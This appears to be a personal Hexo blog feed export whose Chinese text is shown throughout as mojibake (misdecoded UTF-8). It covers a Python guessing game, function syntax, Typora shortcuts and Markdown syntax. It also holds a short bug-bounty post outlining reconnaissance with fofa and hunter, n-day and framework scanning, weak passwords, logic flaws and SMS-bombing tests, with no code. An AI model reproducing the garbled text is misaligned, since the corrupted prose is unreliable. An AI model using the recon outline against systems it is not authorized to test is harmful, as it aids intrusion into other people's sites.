<p>ç›´åˆ°çŒœå¯¹ä¸ºæ­¢ï¼Œå¹¶åœ¨çŒœå¯¹åï¼Œä¼šè¾“å‡ºä¸€å…±çŒœäº†å‡ æ¬¡ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    rannum = random.randint(<span class="number">1</span>,<span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·å‡ºä»·çŒœæ°´æœä»·æ ¼ï¼šç­”æ¡ˆæ˜¯1åˆ°20ä¹‹é—´æ•´æ•°&quot;</span>)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt;=<span class="number">5</span>:</span><br><span class="line">        num = <span class="built_in">input</span>(<span class="string">&quot;ä½ è¿˜æœ‰&#123;0&#125;æ¬¡æœºä¼šï¼Œ\nè¯·è¾“å…¥ä¸€ä¸ª1åˆ°20çš„æ•´æ•°: &quot;</span>.<span class="built_in">format</span>(<span class="number">5</span>-count))</span><br><span class="line">        <span class="keyword">if</span> num.isdigit():</span><br><span class="line">            num =<span class="built_in">int</span>(num)</span><br><span class="line">            <span class="keyword">if</span> num == rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;æ­å–œä½ ï¼Œç­”å¯¹äº†!&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> num &gt; rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;çŒœçš„æœ‰ç‚¹å¤§&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> num &lt; rannum:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;çŒœçš„æœ‰ç‚¹å°&quot;</span>)</span><br><span class="line">            count = count +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªæ•´æ•°&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ç»™äº†ä½ &quot;</span>,count,<span class="string">&quot;æ¬¡æœºä¼šéƒ½æ²¡ç­”å¯¹ï¼Œæ­£ç¡®çš„ç­”æ¡ˆæ˜¯ï¼š&quot;</span>,rannum,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ€ä¹ˆæ ·ï¼Œè¿™æ¸¸æˆå¥½ç©å§ï¼Ÿ&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æŒ‰ä»»æ„é”®ç»“æŸæ¸¸æˆï¼ŒæŒ‰ç©ºæ ¼é”®ç»§ç»­æ¸¸æˆï¼š&quot;</span>)</span><br><span class="line">    select = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ çš„é€‰æ‹©ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> select != <span class="string">&quot; &quot;</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

    </div>
</div>
<h2 id="ç¼–ç¨‹å‡½æ•°"><strong>ç¼–ç¨‹å‡½æ•°</strong></h2>
<p>å‡½æ•°å®šä¹‰è¯­æ³•æ ¼å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">å‡½æ•°å</span>(<span class="params">var1,var2...varn</span>):</span><br><span class="line">    æ“ä½œæŒ‡ä»¤ä¿¡æ¯</span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€SRCã€‘ä¼—æµ‹æ€è·¯</title>
    <url>/posts/2dc80bc0/</url>
    <content><![CDATA[<p>é›·ç¥ä¼—æµ‹ éœ€è¦æŠ€æœ¯ æœ‰åŸºç¡€å†å‚åŠ  ä¸ç„¶å·åºŸäº† é’±å°‘é€šè¿‡ç‡å¯ä»¥<br>
360ä¼—æµ‹ è¦å…ˆæ‰“é¶åœº é’±å¤š é€šè¿‡ç‡ä½ é‡å¤ç‡é«˜ ä¸æ¨èæ¼æ´ç›’å­ éœ€è¦ç§¯åˆ†è¡¥å¤©<br>
EDUä¼—æµ‹ é’±å¾ˆå°‘ ä¸éš¾ç«çº¿ä¼—æµ‹ é“¶è¡Œä¼—æµ‹ å¿«å‡‰äº†</p>
<p>ä¼—æµ‹æ€è·¯çœ‹æ‰‹é€Ÿ æ”¶å½•èŒƒå›´å¹¿</p>
<p>ä¼—æµ‹å‚å•†ç­‰çº§é“¶è¡Œè¯åˆ¸ï¼šéš¾æ”¿åºœã€EDUã€ä¼ä¸šï¼šä¸­ç­‰ç§äººé¡¹ç›®ï¼šç®€å•ï¼ˆæ¡é’±ï¼Œè®¤è¯†é¡¹ç›®ç»ç†ï¼‰</p>
<p>fofaã€hunteråˆ°å¤„èµ„äº§ æ‰«æŒ‡çº¹ å®šä½oaå’Œæ¡†æ¶ æ‰«nday<br>
arlè¾¹è·‘è¾¹æµ‹ï¼Œæ€¼ç€åå°å’ŒåŠŸèƒ½</p>
<p>æ€è·¯ï¼ˆä¸å¤ªå¸¸è§„ï¼Œåˆ«äººä¸å¤ªä¼šç”¨ï¼‰åˆ©ç”¨iconæ”¶é›†ä¿¡æ¯æŸ¥æ‰¾ç½‘ç«™çš„çœŸæ˜¯ip æŒ–ç½‘ç«™çš„cç«¯ï¼ˆæ¯”è¾ƒå®¹æ˜“æ­ªï¼‰ ä¸ç¡®å®šå¯ä»¥é—®é—®åˆ©ç”¨ç«™ç‚¹æ ‡é¢˜è¿›è¡Œæ¨¡ç³Šæœç´¢å…¬ä¼—å·å°ç¨‹åº å…³é”®è¯æœç´¢è°·æ­Œ/bingè¯­æ³•ï¼šå¾ˆå¤šç‰ç±³èŸéœ€è¦æ­£ç¡®è·¯å¾„æ‰èƒ½æ‰“å¼€ï¼Œä¸ç„¶40X</p>
<p>æ¼æ´æŒ–æ˜<br>
nday æ‰«æ¡†æ¶ ç»„ä»¶æ¼æ´æœªæˆæƒ å¼±å£ä»¤é€»è¾‘æ¼æ´çŸ­ä¿¡è½°ç‚¸ï¼ˆçœ‹èƒ½ä¸èƒ½å¹¶å‘ï¼‰</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€Typoraã€‘typoraå¿«æ·é”®</title>
    <url>/posts/d6f6acd6/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">åŠ ç²—</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">æ’å…¥å›¾åƒ</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">æ–œä½“</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">åˆ é™¤çº¿</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">ä¸‹åˆ’çº¿</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">å…¬å¼å—</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">è¶…é“¾æ¥</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">ä»£ç å—</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">è¡¨æ ¼</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">ä»£ç æ®µ</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">å¼•ç”¨</td>
<td style="text-align:center">&gt;+ç©ºæ ¼</td>
<td style="text-align:center">é€€å‡ºå¼•ç”¨</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">æ®µè½</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">æœ‰åºåˆ—è¡¨</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">æ ‡é¢˜</td>
<td style="text-align:center">Ctrl+æ•°å­—</td>
<td style="text-align:center">æ— åºåˆ—è¡¨</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">å…¨é€‰</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">é€‰ä¸­è¡Œ/å¥</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">é€‰ä¸­æ®µè½</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">é€‰ä¸­å½“å‰è¯</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">è·³è½¬æ‰€é€‰</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">è·³è½¬æ–‡é¦–/æœ«</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">æºä»£ç æ¨¡å¼</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<p>ä¸‹æ–¹èƒŒè¯µè¡¨</p>
<p>â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“<br>
â€ƒâ€ƒâ†“</p>
<table>
<thead>
<tr>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">åŠ ç²—</td>
<td style="text-align:center"></td>
<td style="text-align:center">æ’å…¥å›¾åƒ</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">æ–œä½“</td>
<td style="text-align:center"></td>
<td style="text-align:center">åˆ é™¤çº¿</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">ä¸‹åˆ’çº¿</td>
<td style="text-align:center"></td>
<td style="text-align:center">å…¬å¼å—</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">è¶…é“¾æ¥</td>
<td style="text-align:center"></td>
<td style="text-align:center">ä»£ç å—</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">è¡¨æ ¼</td>
<td style="text-align:center"></td>
<td style="text-align:center">ä»£ç æ®µ</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">å¼•ç”¨</td>
<td style="text-align:center"></td>
<td style="text-align:center">é€€å‡ºå¼•ç”¨</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">æ®µè½</td>
<td style="text-align:center"></td>
<td style="text-align:center">æœ‰åºåˆ—è¡¨</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">æ ‡é¢˜</td>
<td style="text-align:center"></td>
<td style="text-align:center">æ— åºåˆ—è¡¨</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">å…¨é€‰</td>
<td style="text-align:center"></td>
<td style="text-align:center">é€‰ä¸­è¡Œ/å¥</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">é€‰ä¸­æ®µè½</td>
<td style="text-align:center"></td>
<td style="text-align:center">é€‰ä¸­å½“å‰è¯</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">è·³è½¬æ‰€é€‰</td>
<td style="text-align:center"></td>
<td style="text-align:center">è·³è½¬æ–‡é¦–/æœ«</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">æºä»£ç æ¨¡å¼</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Typoraã€‘typoraçŸ¥è¯†æ€»ç»“</title>
    <url>/posts/287bb156/</url>
    <content><![CDATA[<h2 id="Markdownè¯­æ³•">Markdownè¯­æ³•</h2>
<h3 id="å¿«æ·é”®æ±‡æ€»">å¿«æ·é”®æ±‡æ€»</h3>
<table>
<thead>
<tr>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">åŠ ç²—</td>
<td style="text-align:center">Ctrl+B</td>
<td style="text-align:center">æ’å…¥å›¾åƒ</td>
<td style="text-align:center">Ctrl+Shift+I</td>
</tr>
<tr>
<td style="text-align:center">æ–œä½“</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center">åˆ é™¤çº¿</td>
<td style="text-align:center">Alt+Shift+5</td>
</tr>
<tr>
<td style="text-align:center">ä¸‹åˆ’çº¿</td>
<td style="text-align:center">Ctrl+U</td>
<td style="text-align:center">å…¬å¼å—</td>
<td style="text-align:center">Ctrl+Shift+M</td>
</tr>
<tr>
<td style="text-align:center">è¶…é“¾æ¥</td>
<td style="text-align:center">Ctrl+K</td>
<td style="text-align:center">ä»£ç å—</td>
<td style="text-align:center">Ctrl+Shift+K</td>
</tr>
<tr>
<td style="text-align:center">è¡¨æ ¼</td>
<td style="text-align:center">Ctrl+T</td>
<td style="text-align:center">ä»£ç æ®µ</td>
<td style="text-align:center">Ctrl+Shift+`</td>
</tr>
<tr>
<td style="text-align:center">å¼•ç”¨</td>
<td style="text-align:center">&gt;+ç©ºæ ¼</td>
<td style="text-align:center">é€€å‡ºå¼•ç”¨</td>
<td style="text-align:center">Shift+Tab</td>
</tr>
<tr>
<td style="text-align:center">æ®µè½</td>
<td style="text-align:center">Ctrl+0</td>
<td style="text-align:center">æœ‰åºåˆ—è¡¨</td>
<td style="text-align:center">Ctrl+Shift+[</td>
</tr>
<tr>
<td style="text-align:center">æ ‡é¢˜</td>
<td style="text-align:center">Ctrl+æ•°å­—</td>
<td style="text-align:center">æ— åºåˆ—è¡¨</td>
<td style="text-align:center">Ctrl+Shift+]</td>
</tr>
<tr>
<td style="text-align:center">å…¨é€‰</td>
<td style="text-align:center">Ctrl+A</td>
<td style="text-align:center">é€‰ä¸­è¡Œ/å¥</td>
<td style="text-align:center">Ctrl+L</td>
</tr>
<tr>
<td style="text-align:center">é€‰ä¸­æ®µè½</td>
<td style="text-align:center">Ctrl+E</td>
<td style="text-align:center">é€‰ä¸­å½“å‰è¯</td>
<td style="text-align:center">Ctrl+D</td>
</tr>
<tr>
<td style="text-align:center">è·³è½¬æ‰€é€‰</td>
<td style="text-align:center">Ctrl+J</td>
<td style="text-align:center">è·³è½¬æ–‡é¦–/æœ«</td>
<td style="text-align:center">Ctrl+Home/End</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center">æºä»£ç æ¨¡å¼</td>
<td style="text-align:center">Ctrl+/</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<h3 id="æ®µè½">æ®µè½</h3>
<h4 id="æ ‡é¢˜">æ ‡é¢˜</h4>
<p>ä½¿ç”¨ # å¯ä»¥è¡¨ç¤ºæ ‡é¢˜ï¼Œä¸€çº§æ ‡é¢˜å¯¹åº”ä¸€ä¸ª # ï¼ŒäºŒçº§æ ‡é¢˜å¯¹åº”ä¸¤ä¸ª # å·ï¼Œæœ€å¤šè‡³å…­çº§æ ‡é¢˜ã€‚åœ¨Typoraä¸­ï¼Œ# åè¦ç´§æ¥ç€ä¸€ä¸ªç©ºæ ¼æ‰èƒ½è¡¨ç¤ºæ ‡é¢˜ï¼Œå¦åˆ™å°±æ˜¯æ™®é€šå­—ç¬¦ã€‚</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"># h1   <span class="comment">//ä¸€çº§æ ‡é¢˜ å¯¹åº” &lt;h1&gt; &lt;/h1&gt;</span></span><br><span class="line">## h2   <span class="comment">//äºŒçº§æ ‡é¢˜ å¯¹åº” &lt;h2&gt; &lt;/h2&gt;</span></span><br><span class="line">### h3  <span class="comment">//ä¸‰çº§æ ‡é¢˜ å¯¹åº” &lt;h3&gt; &lt;/h3&gt;</span></span><br><span class="line">#### h4  <span class="comment">//å››çº§æ ‡é¢˜ å¯¹åº” &lt;h4&gt; &lt;/h4&gt;</span></span><br><span class="line">##### h5  <span class="comment">//äº”çº§æ ‡é¢˜ å¯¹åº” &lt;h5&gt; &lt;/h5&gt;</span></span><br><span class="line">###### h6  <span class="comment">//å…­çº§æ ‡é¢˜ å¯¹åº” &lt;h6&gt; &lt;/h6&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="å­—ä½“">å­—ä½“</h4>
<table>
<thead>
<tr>
<th style="text-align:center">æ ¼å¼</th>
<th style="text-align:center">åŠŸèƒ½</th>
<th style="text-align:center">å¿«æ·é”®</th>
<th style="text-align:center">å±•ç¤º</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*è¿™æ˜¯æ–œä½“*<br>_è¿™æ˜¯æ–œä½“_</td>
<td style="text-align:center">æ–œä½“æ–‡æœ¬</td>
<td style="text-align:center">Ctrl+I</td>
<td style="text-align:center"><em>è¿™æ˜¯æ–œä½“</em></td>
</tr>
<tr>
<td style="text-align:center">**è¿™æ˜¯ç²—ä½“**<br>__è¿™æ˜¯ç²—ä½“__</td>
<td style="text-align:center">ç²—ä½“æ–‡æœ¬</td>
<td style="text-align:center">Crtl+B</td>
<td style="text-align:center"><strong>è¿™æ˜¯ç²—ä½“</strong></td>
</tr>
<tr>
<td style="text-align:center">***è¿™æ˜¯ç²—æ–œä½“***<br>___è¿™æ˜¯ç²—æ–œä½“___</td>
<td style="text-align:center">ç²—æ–œä½“æ–‡æœ¬</td>
<td style="text-align:center">æ— </td>
<td style="text-align:center"><em><strong>è¿™æ˜¯ç²—æ–œä½“</strong></em></td>
</tr>
</tbody>
</table>
<p>åœ¨hexoä¸­ï¼Œä¸ºé¿å…å­—ä½“æ ·å¼é”™è¯¯ï¼Œæœ€å¥½ä¸è¦è®©ä¿®æ”¹å­—ä½“æ ·å¼çš„æ ‡è¯†ç¬¦ä¸­ç´§æŒ¨åˆ«çš„å­—ç¬¦ï¼Œæˆ–è€…åœ¨ä¸¤ç«¯å¤–æ·»åŠ ç©ºæ ¼ã€‚ä»¥å¦‚ä¸‹ä»£ç è¿›è¡Œç¤ºèŒƒï¼š</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="strong">**ä½ å¥½**</span>ã€‚æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</span><br><span class="line"><span class="strong">**ä½ å¥½ã€‚**</span>æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</span><br><span class="line"><span class="strong">**ä½ å¥½ã€‚**</span> æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨ï¼šç¬¬äºŒè¡Œå…¶å®æ²¡æœ‰ç©ºæ ¼ï¼Œå› ä¸ºè£…äº†auto_spacingï¼Œå¼ºåˆ¶åŠ äº†ç©ºæ ¼</font></p>
<p><strong>ä½ å¥½</strong>ã€‚æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</p>
<p>**ä½ å¥½ã€‚**æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</p>
<p><strong>ä½ å¥½ã€‚</strong> æˆ‘æ˜¯å…¨ä¸–ç•Œæœ€å¸…çš„äºº</p>
<p><font size="2">æ³¨ï¼šåœ¨typoraä¸­ï¼Œå¹¶ä¸ä¼šé€ æˆé”™è¯¯</font></p>
<h4 id="ä»£ç ">ä»£ç </h4>
<p>å¦‚æœæ˜¯ä¸€è¡Œä»£ç ï¼Œå¯ä»¥ä½¿ç”¨æ®µå†…ä»£ç å—æ¥è¡¨ç¤ºï¼Œç”¨ä¸€å¯¹ <strong>'</strong>ï¼ˆæ•°å­—1æ—è¾¹çš„ç¬¦å·ï¼‰æ‹¬ä½ä»£ç ã€‚æ¯”å¦‚<code>printf(&quot;Hello World!&quot;)</code></p>
<p>å¦‚æœæ˜¯ä»£ç æ®µï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<strong>ä¸‰ä¸ª ` åŠ Enter/ç©ºæ ¼+ç¼–ç¨‹è¯­è¨€</strong>æ¥è¡¨ç¤ºã€‚å¦‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥åœ¨ä»£ç å—çš„å³ä¸‹è§’é€‰æ‹©ç¼–ç¨‹è¯­è¨€ã€‚</p>
<h4 id="é“¾æ¥-a-id-t1p8-a">é“¾æ¥<a id="t1p8"></a></h4>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é“¾æ¥æ‰“å¼€ç½‘é¡µï¼Œä¹Ÿå¯ä»¥æ‰“å¼€æœ¬åœ°æ–‡ä»¶å’Œå®ç°é¡µå†…è·³è½¬ã€‚é“¾æ¥çš„å‡ ç§ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[é“¾æ¥æ–‡å­—]</span>(é“¾æ¥åœ°å€)</span><br><span class="line"><span class="number">2</span>.&lt;é“¾æ¥åœ°å€&gt;</span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[é“¾æ¥æ–‡å­—]</span><span class="selector-attr">[é“¾æ¥ID]</span></span><br><span class="line">  <span class="selector-attr">[é“¾æ¥ID]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[é“¾æ¥æ–‡å­—]</span><span class="selector-attr">[]</span></span><br><span class="line">  <span class="selector-attr">[é“¾æ¥æ–‡å­—]</span>:http:<span class="comment">//XXXXXXXX.XXX</span></span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹åˆ—æ ·ä¾‹è¿›è¡Œæ¼”ç¤ºï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="selector-attr">[ç™¾åº¦]</span>(https:<span class="comment">//www.baidu.com/ &quot;ç™¾åº¦æœç´¢&quot;)   ç»å¯¹é“¾æ¥</span></span><br><span class="line"><span class="number">2</span>.&lt;https:<span class="comment">//www.baidu.com/&gt;</span></span><br><span class="line"><span class="number">3</span>.<span class="selector-attr">[About]</span>(/about/ <span class="string">&quot;å…³äºæˆ‘&quot;</span>)   ç›¸å¯¹é“¾æ¥</span><br><span class="line"><span class="number">4</span>.<span class="selector-attr">[æ‰“å¼€hello-wordæ–‡æ¡£]</span>(../<span class="number">4</span>a17b156 <span class="string">&quot;hello-world&quot;</span>)  ç›¸å¯¹é“¾æ¥æ‰“å¼€æ–‡ç« </span><br><span class="line"><span class="number">5</span>.<span class="selector-attr">[æ‰“å¼€002.pngç…§ç‰‡]</span>(../../images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;002.png&quot;</span>)  ç›¸å¯¹é“¾æ¥æ‰“å¼€å›¾ç‰‡</span><br><span class="line"><span class="number">6</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[ID]</span></span><br><span class="line"><span class="selector-attr">[ID]</span>:https:<span class="comment">//www.mcorazon.top &quot;æˆ‘çš„åšå®¢ä¸»é¡µ&quot;</span></span><br><span class="line"><span class="number">7</span>.<span class="selector-attr">[My Home]</span><span class="selector-attr">[]</span></span><br><span class="line"><span class="selector-attr">[My Home]</span>:https:<span class="comment">//www.mcorazon.top &quot;æˆ‘çš„åšå®¢ä¸»é¡µ&quot;</span></span><br><span class="line"><span class="number">8</span>.<span class="selector-attr">[è·³è½¬åˆ°æ­¤å°èŠ‚é¦–]</span>(#t1p8ï¼‰</span><br></pre></td></tr></table></figure>
<p><font size="2"><em>æ³¨ï¼š1. å¼•å·éƒ¨åˆ†è¡¨ç¤ºtitleï¼Œå¯ä»¥çœç•¥ã€‚æ ·å¼2ä¸å¯åŠ title<br>2. ä¸èƒ½ä½¿ç”¨<code>&lt;Â  &gt;</code>è·³è½¬æœ¬åœ°æ–‡ä»¶ï¼Œå¦‚&lt;../../images/002.png&gt; ï¼Œå…¶å¹¶ä¸ä¼šè¡¨ç¤ºä¸ºå¯è¿æ¥çŠ¶æ€<br>3.åŒæ—¶ï¼Œä½¿ç”¨ç¬¬å…«ä¸ªæ ·ä¾‹æ—¶éœ€è¦æ·»åŠ é”šç‚¹ï¼Œåœ¨1.8çš„æ ‡é¢˜åæ·»åŠ äº†<code>&lt;a id=&quot;t1p8&quot;&gt;&lt;/a&gt;</code></em></font></p>
<p>ä»¥ä¸Šä»£ç çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p>1.<a href="https://www.baidu.com/" title="ç™¾åº¦æœç´¢">ç™¾åº¦</a> â€ƒ â€ƒâ€ƒâ€ƒç»å¯¹é“¾æ¥<br>
2.&lt;<a href="https://www.baidu.com/">https://www.baidu.com/</a> &gt;<br>
3.<a href="/about/" title="å…³äºæˆ‘">About</a>   â€ƒâ€ƒâ€ƒâ€ƒç›¸å¯¹é“¾æ¥<br>
4.<a href="../4a17b156" title="hello-world">æ‰“å¼€hello-wordæ–‡æ¡£</a>  â€ƒâ€ƒâ€ƒâ€ƒç›¸å¯¹é“¾æ¥æ‰“å¼€æ–‡ç« <br>
5.<a href="../../images/002.png" title="002.png">æ‰“å¼€002.pngç…§ç‰‡</a>  â€ƒâ€ƒâ€ƒâ€ƒç›¸å¯¹é“¾æ¥æ‰“å¼€å›¾ç‰‡<br>
6.<a href="https://www.mcorazon.top" title="æˆ‘çš„åšå®¢ä¸»é¡µ">My Home</a>â€ƒâ€ƒâ€ƒâ€ƒâ€ƒæˆ‘çš„åšå®¢ä¸»é¡µ</p>
<p>7.<a href="https://www.mcorazon.top" title="æˆ‘çš„åšå®¢ä¸»é¡µ">My Home</a>â€ƒâ€ƒâ€ƒâ€ƒâ€ƒæˆ‘çš„åšå®¢ä¸»é¡µ</p>
<p>8.<a href="#t1p8">è·³è½¬åˆ°æ­¤å°èŠ‚é¦–</a></p>
<h4 id="ä¸Šæ ‡ä¸‹æ ‡">ä¸Šæ ‡ä¸‹æ ‡</h4>
<p>ä¸Šä¸‹æ ‡å¯ä»¥ä½¿ç”¨<code>^X^</code>ï¼Œ<code>~X~</code>æ¥å®ç°ã€‚å¦‚ï¼š</p>
<p>ä¸Šæ ‡ï¼ša<sup>X</sup>ï¼Œä¸‹æ ‡ï¼ša<sub>X</sub></p>
<p><s>å¦‚æœä½œä¸ºä¸Šæ ‡ã€ä¸‹æ ‡çš„ç¬¦å·ä¸æ­¢ä¸€ä¸ªï¼Œåˆ™éœ€è¦ç”¨èŠ±æ‹¬å·{}å°†å…¶æ‹¬èµ·æ¥ã€‚å¦‚ï¼š</s></p>
<p><s>ä¸Š æ ‡ ä¸º 12 ï¼š a 12 , ä¸‹ æ ‡ ä¸º 34 ï¼š a 34 ä¸Šæ ‡ä¸º12ï¼ša<sup>{12},ä¸‹æ ‡ä¸º34ï¼ša~{34</sup>2^}~ ä¸Šæ ‡ä¸º12ï¼ša<sup>12</sup>,ä¸‹æ ‡ä¸º34ï¼ša34</s></p>
<h4 id="ç‰¹æ®Šç¬¦å·">ç‰¹æ®Šç¬¦å·</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>ï¼ˆ1ï¼‰å¯¹äº Markdown ä¸­çš„è¯­æ³•ç¬¦å·ï¼Œå‰é¢åŠ åæ–œçº¿\å³å¯æ˜¾ç¤ºç¬¦å·æœ¬èº«ã€‚</p>
</li>
<li class="lvl-2">
<p>ï¼ˆ2ï¼‰å…¶ä»–ç‰¹æ®Šå­—ç¬¦ä½¿ç”¨Unicodeç è¡¨ç¤ºï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<p><img src="/posts/287bb156//image-20241110173249216.png" alt="image-20241110173249216"></p>
</li>
</ul>
